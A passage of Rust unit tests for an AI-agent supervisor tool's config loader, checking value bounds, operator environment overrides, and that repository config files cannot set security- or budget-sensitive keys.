            ("ZIRV_CTX_PROXY_TYPESAFE_CREDENTIAL_ENV", "MY_KEY"),
            ("ZIRV_CTX_PROXY_TYPESAFE_MODEL", "jev-next"),
            ("ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS", "3"),
        ]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect("the operator's own environment may set these keys");
        assert!(cfg.proxy.enabled);
        assert_eq!(cfg.proxy.decider, ProxyDecider::Helper);
        assert_eq!(cfg.proxy.min_confidence, 0.75);
        assert_eq!(cfg.proxy.min_margin, 0.35);
        assert_eq!(cfg.proxy.request_max_bytes, 4096);
        assert_eq!(cfg.proxy.typesafe.base_url, "http://localhost:9999");
        assert_eq!(cfg.proxy.typesafe.credential_env, "MY_KEY");
        assert_eq!(cfg.proxy.typesafe.model, "jev-next");
        assert_eq!(cfg.proxy.typesafe.timeout_secs, 3);
    }

    /// Issue #537 seam, review finding: `[proxy]`'s three bounded numeric
    /// keys are validated once at load, as a hard error naming the key --
    /// never a silent clamp -- matching every other range check `load`
    /// makes (`fallback.*`'s percentage bounds, `chat.claude_permission_
    /// mode`'s fixed set).
    #[test]
    fn proxy_bounds_are_validated_at_load() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        for (env_pairs, expected_key) in [
            (
                vec![("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "1.5")],
                "proxy.min_confidence",
            ),
            (
                vec![("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "-0.1")],
                "proxy.min_confidence",
            ),
            (
                vec![("ZIRV_CTX_PROXY_MIN_MARGIN", "1.5")],
                "proxy.min_margin",
            ),
            (
                vec![("ZIRV_CTX_PROXY_MIN_MARGIN", "-0.1")],
                "proxy.min_margin",
            ),
            (
                vec![("ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS", "0")],
                "proxy.typesafe.timeout_secs",
            ),
            (
                vec![("ZIRV_CTX_PROXY_REQUEST_MAX_BYTES", "10")],
                "proxy.request_max_bytes",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            let env = env_map(&env_pairs);
            let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err(&format!(
                "{expected_key} out of range must be a load-time error"
            ));
            assert!(
                err.to_string().contains(expected_key),
                "expected error naming {expected_key}: {err}"
            );
        }
    }

    /// The documented lower bounds (`0.0`, `1`, `MIN_PROXY_REQUEST_MAX_
    /// BYTES`) are themselves valid, not just narrowly excluded.
    #[test]
    fn proxy_bounds_accept_their_own_edges() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "0"),
            ("ZIRV_CTX_PROXY_MIN_MARGIN", "0"),
            ("ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS", "1"),
            ("ZIRV_CTX_PROXY_REQUEST_MAX_BYTES", "1024"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect("the documented lower bounds must be accepted");
        assert_eq!(cfg.proxy.min_confidence, 0.0);
        assert_eq!(cfg.proxy.min_margin, 0.0);
        assert_eq!(cfg.proxy.typesafe.timeout_secs, 1);
        assert_eq!(cfg.proxy.request_max_bytes, 1024);
    }

    /// The operator's own home layer may still set `[jev]` keys directly in
    /// TOML, same as any other operator-only table.
    #[test]
    fn an_operator_layer_can_set_jev_keys_from_toml() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[jev]\nmemory = true\ngates = true\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(cfg.jev.memory);
        assert!(cfg.jev.gates);
        assert!(!cfg.jev.supervisor);
        assert!(!cfg.jev.dispatch);
        assert!(!cfg.jev.review);
    }

    /// Every `[jev]` key is `REPO_FORBIDDEN`: a repo checkout must not be
    /// able to turn on a Jev-backed decision path for itself.
    #[test]
    fn jev_keys_are_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        for (toml, offending_key) in [
            ("[jev]\nmemory = true\n", "memory"),
            ("[jev]\nsupervisor = true\n", "supervisor"),
            ("[jev]\ndispatch = true\n", "dispatch"),
            ("[jev]\nreview = true\n", "review"),
            ("[jev]\ngates = true\n", "gates"),
            ("[jev]\ncontext = true\n", "context"),
            ("[jev]\nintake_savings = true\n", "intake_savings"),
            ("[jev]\nreview_reuse = true\n", "review_reuse"),
            ("[jev]\nharvest_screen = true\n", "harvest_screen"),
            ("[jev]\nadmin_dispatch = true\n", "admin_dispatch"),
            ("[jev]\napprove = true\n", "approve"),
            ("[jev]\napprove_allow = true\n", "approve_allow"),
            ("[jev]\nclassify = true\n", "classify"),
            ("[jev]\nhandoff_select = true\n", "handoff_select"),
            ("[jev]\ncompaction_select = true\n", "compaction_select"),
            ("[jev]\ninject_screen = true\n", "inject_screen"),
            ("[jev]\ninject = true\n", "inject"),
            ("[jev]\nstop_verify = true\n", "stop_verify"),
            ("[jev]\nmissing_tests = true\n", "missing_tests"),
            ("[jev]\nlaunch_effort = true\n", "launch_effort"),
            ("[jev]\nretry = true\n", "retry"),
            ("[jev]\ncache_ttl_secs = 1\n", "cache_ttl_secs"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
                &format!("a repository must not be able to set jev.{offending_key}"),
            );
            assert!(
                is_repo_forbidden(err.as_ref()),
                "jev.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
            );
        }
    }

    /// The operator's own escape hatches: `~/.zirv/ctx.toml` and every
    /// `ZIRV_CTX_JEV_*` env var may still set these keys.
    #[test]
    fn the_operator_can_still_set_jev_keys_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_JEV_MEMORY", "true"),
            ("ZIRV_CTX_JEV_SUPERVISOR", "true"),
            ("ZIRV_CTX_JEV_DISPATCH", "true"),
            ("ZIRV_CTX_JEV_REVIEW", "true"),
            ("ZIRV_CTX_JEV_GATES", "true"),
            ("ZIRV_CTX_JEV_CONTEXT", "true"),
            ("ZIRV_CTX_JEV_INTAKE_SAVINGS", "true"),
            ("ZIRV_CTX_JEV_REVIEW_REUSE", "true"),
            ("ZIRV_CTX_JEV_HARVEST_SCREEN", "true"),
            ("ZIRV_CTX_JEV_ADMIN_DISPATCH", "true"),
            ("ZIRV_CTX_JEV_APPROVE", "true"),
            ("ZIRV_CTX_JEV_APPROVE_ALLOW", "true"),
            ("ZIRV_CTX_JEV_CLASSIFY", "true"),
            ("ZIRV_CTX_JEV_HANDOFF_SELECT", "true"),
            ("ZIRV_CTX_JEV_COMPACTION_SELECT", "true"),
            ("ZIRV_CTX_JEV_INJECT_SCREEN", "true"),
            ("ZIRV_CTX_JEV_INJECT", "true"),
            ("ZIRV_CTX_JEV_STOP_VERIFY", "true"),
            ("ZIRV_CTX_JEV_MISSING_TESTS", "true"),
            ("ZIRV_CTX_JEV_LAUNCH_EFFORT", "true"),
            ("ZIRV_CTX_JEV_RETRY", "true"),
            ("ZIRV_CTX_JEV_CACHE_TTL_SECS", "3600"),
        ]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect("the operator's own environment may set these keys");
        assert!(cfg.jev.memory);
        assert!(cfg.jev.supervisor);
        assert!(cfg.jev.dispatch);
        assert!(cfg.jev.review);
        assert!(cfg.jev.gates);
        assert!(cfg.jev.context);
        assert!(cfg.jev.intake_savings);
        assert!(cfg.jev.review_reuse);
        assert!(cfg.jev.harvest_screen);
        assert!(cfg.jev.admin_dispatch);
        assert!(cfg.jev.approve);
        assert!(cfg.jev.approve_allow);
        assert!(cfg.jev.classify);
        assert!(cfg.jev.handoff_select);
        assert!(cfg.jev.compaction_select);
        assert!(cfg.jev.inject_screen);
        assert!(cfg.jev.inject);
        assert!(cfg.jev.stop_verify);
        assert!(cfg.jev.missing_tests);
        assert!(cfg.jev.launch_effort);
        assert!(cfg.jev.retry);
        assert_eq!(cfg.jev.cache_ttl_secs, 3600);
    }

    /// Issue #803: the WHOLE `[jev.floors]` table is `REPO_FORBIDDEN`, same
    /// reasoning as `jev_keys_are_repo_forbidden` above -- a repo checkout
    /// setting any site's floor at all must be rejected.
    #[test]
    fn jev_floors_table_is_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[jev.floors.dispatch]\nmin_confidence = 0.9\n",
        )
        .expect("write");

        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to set jev.floors.*");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "jev.floors must be rejected as REPO_FORBIDDEN: {err}"
        );
    }

    /// Issue #803: the operator's own `ZIRV_CTX_JEV_FLOOR_<SITE>_MIN_
    /// CONFIDENCE|_MIN_MARGIN` env vars set the matching site's floor, and
    /// only that site -- every other site stays unset.
    #[test]
    fn jev_floor_env_overrides_set_only_the_named_site() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_JEV_FLOOR_DISPATCH_MIN_CONFIDENCE", "0.9"),
            ("ZIRV_CTX_JEV_FLOOR_DISPATCH_MIN_MARGIN", "0.35"),
        ]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect("the operator's own environment may set jev.floors.*");
        assert_eq!(cfg.jev.floors.dispatch.min_confidence, Some(0.9));
        assert_eq!(cfg.jev.floors.dispatch.min_margin, Some(0.35));
        assert_eq!(cfg.jev.floors.memory.min_confidence, None);
        assert_eq!(cfg.jev.floors.memory.min_margin, None);
    }

    /// Issue #803: an out-of-range floor is a loud load-time error, the same
    /// convention `proxy.min_confidence`/`proxy.min_margin` already hold --
    /// never a silent clamp.
    #[test]
    fn jev_floor_out_of_range_is_a_named_config_error() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_JEV_FLOOR_MEMORY_MIN_CONFIDENCE", "1.5")]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("an out-of-range floor must fail to load");
        assert!(
            err.to_string().contains("jev.floors.memory.min_confidence"),
            "error must name the exact offending key: {err}"
        );
    }

    /// Every `[headless]` key is `REPO_FORBIDDEN`: a repo checkout must not
    /// be able to turn on a headless cost lever for itself -- same reasoning
    /// as `jev_keys_are_repo_forbidden` above.
    #[test]
    fn headless_keys_are_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        for (toml, offending_key) in [
            (
                "[headless]\nprompt_cache_ttl = \"1h\"\n",
                "prompt_cache_ttl",
            ),
            ("[headless]\nlean = true\n", "lean"),
            (
                "[headless]\ndisallowed_tools = [\"WebFetch\"]\n",
                "disallowed_tools",
            ),
            ("[headless.effort]\ntrivial = \"low\"\n", "effort.trivial"),
            (
                "[headless.effort]\nbounded = \"medium\"\n",
                "effort.bounded",
            ),
            (
                "[headless.effort]\nsubstantial = \"high\"\n",
                "effort.substantial",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
                &format!("a repository must not be able to set headless.{offending_key}"),
            );
            assert!(
                is_repo_forbidden(err.as_ref()),
                "headless.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
            );
        }
    }

    /// Issue #840: a repository can neither switch the approvals inbox on nor stretch a hold, but the environment can.
    #[test]
    fn approvals_keys_are_repo_forbidden_and_env_settable() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        for (toml, key) in [
            ("[approvals]\ninbox = true\n", "inbox"),
            ("[approvals]\nhold_secs = 10\n", "hold_secs"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("a repository must not set approvals.{key}"));
            assert!(is_repo_forbidden(err.as_ref()), "approvals.{key}: {err}");
        }
        let env = env_map(&[
            ("ZIRV_CTX_APPROVALS_INBOX", "true"),
            ("ZIRV_CTX_APPROVALS_HOLD_SECS", "60"),
        ]);
        let repo = tempfile::tempdir().expect("tempdir");
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.approvals.inbox);
        assert_eq!(cfg.approvals.hold_secs, 60);
        let bad = env_map(&[("ZIRV_CTX_APPROVALS_HOLD_SECS", "9999")]);
        assert!(CtxConfig::load(repo.path(), &|k| bad.get(k).cloned()).is_err());
    }

    /// The operator's own escape hatches: `~/.zirv/ctx.toml` and every
    /// `ZIRV_CTX_HEADLESS_*` env var may still set these keys.
    #[test]
    fn the_operator_can_still_set_headless_keys_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_HEADLESS_PROMPT_CACHE_TTL", "5m"),
            ("ZIRV_CTX_HEADLESS_LEAN", "true"),
            ("ZIRV_CTX_HEADLESS_DISALLOWED_TOOLS", "WebFetch, Task"),
            ("ZIRV_CTX_HEADLESS_EFFORT_TRIVIAL", "low"),
            ("ZIRV_CTX_HEADLESS_EFFORT_BOUNDED", "medium"),
            ("ZIRV_CTX_HEADLESS_EFFORT_SUBSTANTIAL", "high"),
        ]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect("the operator's own environment may set these keys");
        assert_eq!(cfg.headless.prompt_cache_ttl.as_deref(), Some("5m"));
        assert!(cfg.headless.lean);
        assert_eq!(
            cfg.headless.disallowed_tools,
            vec!["WebFetch".to_string(), "Task".to_string()]
        );
        assert_eq!(cfg.headless.effort.trivial.as_deref(), Some("low"));
        assert_eq!(cfg.headless.effort.bounded.as_deref(), Some("medium"));
        assert_eq!(cfg.headless.effort.substantial.as_deref(), Some("high"));

        // `lean` and the TTL default on; the operator's env turns lean off.
        let env = env_map(&[("ZIRV_CTX_HEADLESS_LEAN", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.headless.lean);
        assert_eq!(cfg.headless.prompt_cache_ttl.as_deref(), Some("5m"));
        let cfg = CtxConfig::load(repo.path(), &|_| None).expect("load");
        assert!(cfg.headless.lean);
    }

    /// `headless.prompt_cache_ttl` and `headless.effort.*` are constrained to
    /// exactly the values Claude Code's own CLI/env accept -- an
    /// unrecognized value is a load-time error naming the key, the same
    /// "loud rather than silent" style `chat.claude_permission_mode`'s own
    /// validation above uses.
    #[test]
    fn headless_prompt_cache_ttl_and_effort_reject_bad_values() {
        let repo = tempfile::tempdir().expect("tempdir");

        let env = env_map(&[("ZIRV_CTX_HEADLESS_PROMPT_CACHE_TTL", "30m")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("an unrecognized ttl must be refused");
        assert!(
            err.to_string().contains("headless.prompt_cache_ttl"),
            "got {err}"
        );

        let env = env_map(&[("ZIRV_CTX_HEADLESS_EFFORT_TRIVIAL", "extreme")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("an unrecognized effort level must be refused");
        assert!(
            err.to_string().contains("headless.effort.trivial"),
            "got {err}"
        );
    }

    #[test]
    fn the_operator_can_still_set_those_keys_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_AGENT_BIN", "/opt/homebrew/bin/claude"),
            ("ZIRV_CTX_ON_FAILURE", "say done"),
            ("ZIRV_CTX_MODEL", "sonnet"),
            ("ZIRV_CTX_AGENT", "codex"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.agent_bin.as_deref(), Some("/opt/homebrew/bin/claude"));
        assert_eq!(cfg.supervise.on_failure.as_deref(), Some("say done"));
        assert_eq!(cfg.handoff.model.as_deref(), Some("sonnet"));
        assert_eq!(cfg.agent.as_deref(), Some("codex"));
    }

    /// Ordinary thresholds like `tail_items` shape *how* a run behaves, not
    /// *what* runs or whose account it spends, so they stay repo-settable.
    /// (`agent` used to sit in this bucket too; it moved to `REPO_FORBIDDEN`
    /// once codex became selectable, because picking the adapter picks the
    /// vendor account -- see `a_repository_config_cannot_name_what_the_tool_runs`.)
    #[test]
    fn a_repository_may_still_choose_the_thresholds() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[handoff]\ntail_items = 9\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.handoff.tail_items, 9);
        assert_eq!(
            cfg.handoff.model, None,
            "still the default: per-adapter resolution now lives in resolve_distiller_model"
        );
    }

    #[test]
    fn missing_files_are_not_an_error() {
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 10);
    }

    #[test]
    fn pacing_reads_from_the_repo_config_file() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nenabled = false\nmax_percent = 80.5\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        // T9: `enabled` and `max_percent` now go through the repo-narrowing
        // fold (see `narrow_pace_bool`/`narrow_pace_percent`), not a plain
        // merge -- this repo's own `enabled = false` is a weakening attempt
        // against the (enabled) default and is silently ineffective, while
        // `max_percent = 80.5` genuinely tightens the default 99.0% ceiling
        // and still lands. Every other key in this repo layer (still ordinary
        // merge) is untouched proof the fold is scoped to exactly these keys,
        // not the whole `[pace]` table.
        assert!(
            cfg.pace.enabled,
            "a repo may not disable pacing (T9 narrowing)"
        );
        assert_eq!(cfg.pace.max_percent, 80.5, "a repo may tighten the ceiling");
        assert_eq!(
            cfg.pace.fallback_delay_secs, 900,
            "untouched keys keep defaults"
        );
    }

    #[test]
    fn pacing_env_overrides_cover_floats_and_bools() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE", "false"),
            ("ZIRV_CTX_PACE_MAX_PERCENT", "75"),
            ("ZIRV_CTX_FIVE_HOUR_BUDGET", "1000"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.pace.enabled);
        assert_eq!(
            cfg.pace.max_percent, 75.0,
            "an integer literal must load as a float"
        );
        assert_eq!(cfg.pace.five_hour_budget_tokens, 1000);
    }

    #[test]
    fn spawn_gate_thresholds_are_settable_from_the_operators_own_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE_SPAWN_SOFT_PCT", "70"),
            ("ZIRV_CTX_PACE_SPAWN_HARD_PCT", "90"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.pace.spawn_soft_pct, 70.0);
        assert_eq!(cfg.pace.spawn_hard_pct, 90.0);
    }

    #[test]
    fn a_non_numeric_percent_is_rejected_with_the_variable_named() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PACE_MAX_PERCENT", "loads")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad float");
        let msg = err.to_string();
        assert!(msg.contains("ZIRV_CTX_PACE_MAX_PERCENT"), "got {msg}");
    }

    #[test]
    fn a_non_boolean_flag_is_rejected() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PACE", "yes-please")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
        assert!(err.to_string().contains("ZIRV_CTX_PACE"));
    }

    /// Issue #155, Phase 6(c): unlike `pace.enabled`/`max_percent`/
    /// `soft_percent` (which a repo may repo-narrow -- see `a_repo_layer_
    /// may_only_narrow_pace_enabled_max_percent_and_soft_percent` below),
    /// `spawn_soft_pct`/`spawn_hard_pct` are `REPO_FORBIDDEN` outright: a
    /// checkout may not move either threshold in EITHER direction, not even
    /// to tighten it. Raising either would let a checkout spend past a
    /// ceiling the operator set; a repo-narrowing fold (the `pace.max_
    /// percent` shape) would let a checkout throttle delegation for an
    /// operator who never asked for that either -- a spawn gate has no safe
    /// direction for an untrusted layer to move it, so both are blocked
    /// outright instead.
    #[test]
    fn a_repo_ctx_toml_cannot_move_the_spawn_gate_thresholds_in_either_direction() {
        for repo_toml in [
            "[pace]\nspawn_soft_pct = 10.0\n",
            "[pace]\nspawn_soft_pct = 99.0\n",
            "[pace]\nspawn_hard_pct = 10.0\n",
            "[pace]\nspawn_hard_pct = 99.9\n",
        ] {
            let repo = tempfile::tempdir().expect("repo");
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("a repo may not set: {repo_toml}"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "must be a security refusal for {repo_toml}: {err}"
            );
        }
    }

    /// Issue #285: `run_budget_tokens` is the default soft budget `zirv ctx
    /// objective set` applies when the operator's own `--budget-tokens` is
    /// omitted -- a spend ceiling, so a repo checkout must not be able to
    /// raise it, the same trust asymmetry every other budget key in
    /// `REPO_FORBIDDEN` enforces.
    #[test]
    fn a_repo_ctx_toml_cannot_set_pace_run_budget_tokens() {
        let repo = tempfile::tempdir().expect("repo");
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nrun_budget_tokens = 1000000\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set pace.run_budget_tokens");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    #[test]
    fn a_repo_layer_may_not_touch_use_credits_or_poll_keys() {
        for (toml, key, variable) in [
            (
                "[pace.use_credits]\nclaude = true\n",
                "pace.use_credits",
                "ZIRV_CTX_PACE_USE_CREDITS_CLAUDE",
            ),
            (
                "[pace]\npoll_enabled = false\n",
                "pace.poll_enabled",
                "ZIRV_CTX_PACE_POLL",
            ),
            (
                "[pace]\npoll_min_interval_secs = 1\n",
                "pace.poll_min_interval_secs",
                "ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(key), "name the offending key: {err}");
            assert!(
                err.contains(variable),
                "names the operator escape hatch: {err}"
            );
        }

        // The rejection is real, not decorative: a clean repo layer still
        // loads and keeps the new keys at their defaults.
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.pace.soft_percent, 80.0);
        assert!(cfg.pace.poll_enabled);
        assert_eq!(cfg.pace.poll_min_interval_secs, 60);
        assert!(!cfg.pace.use_credits.claude);
    }

    /// Audit finding G1: the estimator switch, both window budgets and the
    /// cache-read toggle were plain repo-mergeable, so a checkout could turn
    /// the estimator on against a budget of its own choosing and have the
    /// gate pace on numbers it wrote itself. They are `REPO_FORBIDDEN` now.
    /// Review round 1 (R1): `collector_max_age_secs` joined them. It was
    /// narrow-only on the reading that lower is stricter, but a repo lowering
    /// it drops a fresh vendor reading out of `pace::binding` and lets the
    /// estimator's lower figure bind instead -- a bypass in the "stricter"
    /// direction, so neither direction is repo-settable now.
    #[test]
    fn repo_layer_cannot_widen_pace_collector_max_age_or_budgets() {
        for (toml, key, variable) in [
            (
                "[pace]\nestimator = true\n",
                "pace.estimator",
                "ZIRV_CTX_PACE_ESTIMATOR",
            ),
            (
                "[pace]\nfive_hour_budget_tokens = 987654321\n",
                "pace.five_hour_budget_tokens",
                "ZIRV_CTX_FIVE_HOUR_BUDGET",
            ),
            (
                "[pace]\nseven_day_budget_tokens = 987654321\n",
                "pace.seven_day_budget_tokens",
                "ZIRV_CTX_SEVEN_DAY_BUDGET",
            ),
            (
                "[pace]\ncount_cache_reads = true\n",
                "pace.count_cache_reads",
                "ZIRV_CTX_PACE_COUNT_CACHE_READS",
            ),
            (
                "[pace]\ncollector_max_age_secs = 1\n",
                "pace.collector_max_age_secs",
                "ZIRV_CTX_PACE_COLLECTOR_MAX_AGE_SECS",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("a repo may not set: {toml}"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "must be a security refusal for {toml}: {err}"
            );
            let message = err.to_string();
            assert!(message.contains(key), "name the offending key: {message}");
            assert!(
                message.contains(variable),
                "names the operator escape hatch: {message}"
            );
        }

        // The operator's own env still sets every one of them.
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let env = env_map(&[
            ("ZIRV_CTX_PACE_COLLECTOR_MAX_AGE_SECS", "7200"),
            ("ZIRV_CTX_PACE_ESTIMATOR", "false"),
            ("ZIRV_CTX_PACE_COUNT_CACHE_READS", "true"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.pace.collector_max_age_secs, 7200);
        assert!(!cfg.pace.estimator);
        assert!(cfg.pace.count_cache_reads);
    }

    /// T9: `pace.enabled`/`max_percent`/`soft_percent` are deliberately NOT
    /// on `REPO_FORBIDDEN` (unlike `use_credits`/`poll_*` right above) --
    /// they fold like `[policy]` instead, so a repo checkout may narrow
    /// (make pacing stricter) but never widen it. This table proves both
    /// directions actually differ: a repo trying to weaken is silently
    /// ineffective (not an error -- these keys were never forbidden), and a
    /// repo trying to tighten actually lands.
    #[test]
    fn a_repo_layer_may_only_narrow_pace_enabled_max_percent_and_soft_percent() {
        struct Case {
            home: &'static str,
            repo: &'static str,
            want_enabled: bool,
            want_max: f64,
            want_soft: f64,
        }
        for case in [
            // A repo trying to turn pacing OFF against an operator who left
            // it at the (enabled) default must not succeed.
            Case {
                home: "",
                repo: "[pace]\nenabled = false\n",
                want_enabled: true,
                want_max: 99.0,
                want_soft: 80.0,
            },
            // A repo trying to RAISE the ceiling (weaken it) must not
            // succeed -- the operator's tighter home value wins.
            Case {
